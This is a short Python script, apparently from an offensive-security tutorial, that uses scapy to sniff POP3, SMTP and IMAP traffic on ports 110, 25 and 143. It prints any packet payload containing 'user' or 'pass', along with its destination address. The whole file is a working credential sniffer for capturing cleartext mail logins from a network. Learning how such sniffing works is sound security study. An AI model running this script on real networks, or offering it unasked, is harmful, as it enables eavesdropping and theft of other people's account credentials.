from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',
            prn=packet_callback, store=0)
    
if __name__ == '__main__':
    main()